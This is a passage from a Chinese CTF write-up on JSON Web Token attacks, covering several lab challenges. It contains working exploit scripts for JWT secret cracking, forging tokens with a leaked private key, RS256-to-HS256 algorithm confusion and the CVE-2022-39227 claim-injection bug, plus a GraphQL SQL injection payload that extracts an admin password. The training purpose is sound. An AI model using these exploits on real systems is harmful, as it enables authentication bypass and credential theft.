`HS256`加密方式，我们这里的话需要猜解一下密钥，然后修改才有效，既然提示了弱口令，那就可以试试`123456`这种，修改`sub`为`admin`，得到新JWT后去靶场中修改JWT，然后访问admin界面

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921903_63983eaf9b95b2e2e4c05.png!small)

  

### Web348

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921904_63983eb0510b4e1a82f11.png!small)

题目提示爆破，这里就需要先介绍一个爆破工具了，链接如下<https://github.com/brendan-rius/c-jwt-cracker>安装方式也很简单

    
    
    1、git clone https://github.com/brendan-rius/c-jwt-cracker #下载  
    2、make #编译  
    3、./jwtcrack JWT #使用

这里将靶场中的JWT放入其中

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921905_63983eb11f9e7ff2b9d6c.png!small)

爆破出密钥为`aaab`，接下来方法就同上，在解码网站中，修改`sub`为admin，同时添加密钥为`aaab`，然后拿着得到的新JWT，去替换网站的JWT，再去访问admin界面即可。

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921906_63983eb2257df546467ff.png!small)

### Web349

题目给了一个附件，内容如下

    
    
    /* GET home page. */  
    router.get('/', function(req, res, next) {  
    res.type('html');  
    var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');  
    var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });  
    res.cookie('auth',token);  
    res.end('where is flag?');  
      
    });  
      
    router.post('/',function(req,res,next){  
    var flag="flag_here";  
    res.type('html');  
    var auth = req.cookies.auth;  
    var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key  
    jwt.verify(auth, cert, function(err, decoded) {  
    if(decoded.user==='admin'){  
    res.end(flag);  
    }else{  
    res.end('you are not admin');  
    }  
    });  
    });

这里发现可以获取公钥和私钥，`RSA`是用私钥加密，公钥解密，那么我们这里有私钥了，就可以自己写内容，然后用私钥加密，接下来用公钥解密就是我们伪造的内容，所以接下来访问`url
/private.key`获取私钥，然后写个小脚本即可

    
    
    import jwt  
    public = open('private.key', 'r').read()  
    payload={"user":"admin"}  
    print(jwt.encode(payload, key=public, algorithm='RS256'))

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921906_63983eb2efac948537f35.png!small)

接下来替换JWT，然后post访问

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921907_63983eb3c22c51a048777.png!small)

### web350

题目给了附件，在里面发现公钥

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921908_63983eb490fe0e30a8587.png!small)

这里的话应该考察的就是算法修改攻击，然后我们这里修改算法为`HS256`,而后用公钥加密，脚本如下

    
    
    const jwt = require('jsonwebtoken');  
    var fs = require('fs');  
    var privateKey = fs.readFileSync('public.key');  
    var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });  
    console.log(token)

运行脚本需要安装`jsonwebtoken`库

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921909_63983eb559a6a02d228c5.png!small)

得到JWT后替换一下，然后post发包即可获取flag

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921910_63983eb62cf723916905d.png!small)

## [祥云杯2022]FunWeb

>
> 注：因为这道题没有复现环境了，所以我这里的部分图片是来源于网上，参考的是`X1r0z`大师傅的[https://exp10it.cn/](https://exp10it.cn/2022/10/2022-%E7%A5%A5%E4%BA%91%E6%9D%AF-> web-writeup/#funweb%E5%A4%8D%E7%8E%B0)

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921910_63983eb6e9852aa705d58.png!small)

进入环境后是个注册界面，接下来随便注册账号后进行登录

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921911_63983eb7c90dad2de25ed.png!small)

发现上方是有两个功能点的

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921913_63983eb9033eedc0cd309.jpeg!small)

抓`获取成绩`包后发现这里提示`no
admin`同时发现`JWT`，想到这里可能需要伪造JWT，JWT最近新出的漏洞是`CVE-2022-39227`。那么我们就可以尝试用这个漏洞来进行伪造JWT，伪造JWT脚本如下所示

    
    
    from datetime import timedelta  
    from json import loads, dumps  
    from jwcrypto.common import base64url_decode, base64url_encode  
    ​  
    def topic(topic):  
    """ Use mix of JSON and compact format to insert forged claims including long expiration """  
    [header, payload, signature] = topic.split('.')#点分  
    parsed_payload = loads(base64url_decode(payload))#解码  
    parsed_payload['is_admin'] = 1#伪造  
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))#编码  
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'#生成恶意载荷  
    token = topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g')  
    print(token)

接下来想到我们抓的包的文件名是`graphql`，而且还有POST参数，可能存在`graphql`注入。[https://www.leavesongs.com/content/files/slides/GraphQL.pdf](https://www.leavesongs.com/content/files/slides/%E6%94%BB%E5%87%BBGraphQL.pdf)而后使用
`getscoreusingnamehahaha`方法查询表结构。

    
    
    {"query": """{ getscoreusingnamehahaha(name: "null' union select group_concat(sql) FROM sqlite_master; --"){ score name  } }"""}

返回结果如下

    
    
    CREATE TABLE users(  
    ID INTEGER PRIMARY KEY,  
    NAME TEXT NOT NULL,    
    PASSWORD TEXT NOT NULL,  
    SCORE TEXT NOT Null     
    )

因此可以用这个来查询admin用户成绩，构造最终payload如下。

    
    
    import json  
    from jwcrypto.common import base64url_decode, base64url_encode  
    import httpx  
    ​  
    session = httpx.Client(base_url="http://eci-2zeavdwsk859vkrseg75.cloudeci1.ichunqiu.com/")  
    session.post("/signin", json={  
    "username": "test",  
    "password": "111"  
    }  
    )  
    _ = session.cookies.get("token")  
    [header, payload, signature] = _.split('.')  
    parsed_payload = json.loads(base64url_decode(payload))  
    parsed_payload['is_admin'] = 1  
    fake_payload = base64url_encode((json.dumps(parsed_payload, separators=(',', ':'))))  
    forged_jwt = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'  
    session.cookies.delete("token")  
    session.cookies.set("token", forged_jwt)  
    ​  
    data = {"query": """{ getscoreusingnamehahaha(name: "null' union select password FROM users WHERE name='admin'; --"){ score name  } }"""}  
    response = session.post("/graphql", data=data)  
    print(response.text)

得到密码后去登录即可得到flag

## [CISCN2019 华北赛区 Day1 Web2]ikun

进入后发现有登录和注册界面，常规操作先注册后登录

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921914_63983eba2a3c1b6adbc94.png!small)

提示要买到lv6，下划后发现可以买等级

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921915_63983ebbbf71e794c5f0c.png!small)

这里没有lv6，点击下一页看看仍然没有找到lv6，但发现参数是GET型传参

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921916_63983ebce0f51cc2f4c34.png!small)

这意味着我们可以写个小脚本来查找lv6所在位置发现lv3对应的代码是lv3.png，那么lv6对应的就是lv6.png

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921918_63983ebe421db69007c04.png!small)

脚本如下

    
    
    import time  
    import requests  
    url = "http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page="  
    for i in range(1,300):  
    res = requests.get(url+str(i))  
    time.sleep(0.5)  
    if "lv6.png" in res.text:  
    print(i)  
    break

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921919_63983ebf8df5dce1f86eb.png!small)

181页，找到后发现价格是天价，买不起

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921920_63983ec07615434fb3ef0.png!small)

这里抓包看一下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921921_63983ec1494ba9ea9adec.png!small)

发现可以修改折扣，把这个discount修改为`0.00000000000001`然后发包

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921922_63983ec2429540bf75772.png!small)

跳转到了另一个界面但无权限访问再抓包

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921923_63983ec32e2f32fd5c9b7.png!small)

发现JWT，解码一下（解码网站<https://jwt.io/>）

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921924_63983ec451c166b36e7d4.png!small)

我们这里想实现修改root为`admin`，需要有密钥，爆破密钥可以用工具`c-jwt-cracker`得到，链接如下<https://github.com/brendan-rius/c-jwt-cracker>破解后得到密钥为`1Kun`

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921925_63983ec54a2524cf779f7.png!small)

抓包，将得到的值赋给JWT，再发包接下来就是读取源码，然后进行Python反序列化获取最终flag，这里不再演示。

# 后言

`JWT`的靶场有很多个，我这里也只是利用了`CTFhub`和`portswig`等来进行演示，还有一些靶场例如<https://jwt-lab.herokuapp.com/challenges>也是比较好的，但鉴于考察点相似，这里不再演示，有兴趣的师傅可以自行尝试。然后还有就是这里的CVE漏洞的分析我主要参考了我们战队`lemon`大师傅的讲解，大家也可以看一下哇，视频链接如下[https://www.bilibili.com/video/BV15d4y1F7i3](https://www.bilibili.com/video/BV15d4y1F7i3/?spm_id_from=333.337.search-card.all.click&vd_source=414113f33a1cd681c43e79462250b4d0)最后的话本人也只是一个小白，如果有问题还请各位大师傅多多指教。

